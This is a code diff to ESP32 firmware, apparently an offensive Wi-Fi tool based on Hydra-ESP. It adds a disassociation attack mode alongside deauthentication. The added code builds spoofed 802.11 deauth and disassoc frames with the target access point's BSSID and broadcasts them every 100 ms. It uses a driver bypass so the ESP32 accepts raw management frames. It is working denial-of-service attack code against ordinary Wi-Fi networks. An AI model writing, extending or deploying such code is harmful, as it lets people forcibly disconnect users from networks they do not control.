@@ -23,12 +23,14 @@ static volatile int s_expired = 0;     /* timeout reached; owner must stop */
 static volatile uint32_t s_fps = 0;   /* smoothed frames/second */
 static uint32_t s_win_frames = 0;     /* fps window bookkeeping */
 static int64_t s_win_us = 0;
+static deauth_mode_t s_mode = DEAUTH_MODE_DEAUTH;
 
 #define DEAUTH_PERIOD_US 100000 /* Hydra-ESP broadcast cadence */
 
-/* Raw deauth template (Hydra-ESP wsl_bypasser deauth_frame_default):
- * FC c0 00 (MGMT/deauth), duration, dst broadcast, src+bssid patched,
- * seq f0 ff, reason 0x0002. */
+/* Raw management templates, matching Hydra-ESP's wsl_bypasser frames:
+ *   deauth     FC c0, reason 0x0002 (prev auth not valid)
+ *   disassoc   FC a0, reason 0x0001 (unspecified)
+ * dst broadcast, addr2/addr3 patched with the BSSID, seq f0 ff. */
 static void build_deauth(uint8_t *f, const uint8_t bssid[6]) {
     static const uint8_t tpl[26] = {
         0xc0, 0x00, 0x3a, 0x01,
@@ -42,18 +44,40 @@ static void build_deauth(uint8_t *f, const uint8_t bssid[6]) {
     memcpy(f + 16, bssid, 6);
 }
 
+static void build_disassoc(uint8_t *f, const uint8_t bssid[6]) {
+    static const uint8_t tpl[26] = {
+        0xa0, 0x00, 0x3a, 0x01,
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0xf0, 0xff, 0x01, 0x00,
+    };
+    memcpy(f, tpl, sizeof(tpl));
+    memcpy(f + 10, bssid, 6);
+    memcpy(f + 16, bssid, 6);
+}
+
 static void tx_tick(void *arg) {
     (void)arg;
     s_ticks++;                       /* proof the callback fires at all */
     /* TX goes through the WSL bypass so the driver's frame-type gate
      * accepts management subtypes (see wsl_bypasser.h). */
     uint8_t f[26];
-    build_deauth(f, s_bssid);
-    esp_err_t err = wsl_send_raw(f, (int)sizeof(f));
-    s_last_err = (int)err;
-    if (err == ESP_OK) {
-        s_frames++;
-    } else if (!s_tx_err) {
+    int ok_count = 0;
+    esp_err_t err = ESP_OK;
+    int passes = (s_mode == DEAUTH_MODE_COMBINED) ? 2 : 1;
+    for (int i = 0; i < passes; i++) {
+        if (s_mode == DEAUTH_MODE_DISASSOC)
+            build_disassoc(f, s_bssid);
+        else
+            build_deauth(f, s_bssid);
+        err = wsl_send_raw(f, (int)sizeof(f));
+        s_last_err = (int)err;
+        if (err == ESP_OK)
+            ok_count++;
+    }
+    s_frames += (uint32_t)ok_count;
+    if (err != ESP_OK && !s_tx_err) {
         s_tx_err = 1;
         s_tx_errcode = (int)err;
     }
@@ -94,11 +118,14 @@ static esp_err_t probe_tx(void) {
     return probe_subtype(0xc0); /* deauth */
 }
 
-int svc_deauth_start(void) {
+int svc_deauth_start(deauth_mode_t mode) {
     if (s_timer)
         return 0;
+    if (mode >= DEAUTH_MODE_COUNT)
+        return -1;
     if (!tgt_wifi_has())
         return -1;
+    s_mode = mode;
     memcpy(s_bssid, tgt_wifi_bssid(), 6);
     if (svc_wifi_init() != 0)
         return -2;
@@ -178,4 +205,15 @@ uint32_t svc_deauth_remaining_s(void) {
         return 0;
     uint32_t e = svc_deauth_elapsed_s();
     return e >= DEAUTH_TIMEOUT_S ? 0 : DEAUTH_TIMEOUT_S - e;
+}
+
+deauth_mode_t svc_deauth_mode(void) { return s_mode; }
+
+const char *svc_deauth_mode_name(deauth_mode_t m) {
+    switch (m) {
+        case DEAUTH_MODE_DEAUTH:   return "Deauth";
+        case DEAUTH_MODE_DISASSOC: return "Disassoc";
+        case DEAUTH_MODE_COMBINED: return "Deauth+Disassoc";
+        default:                   return "?";
+    }
 }
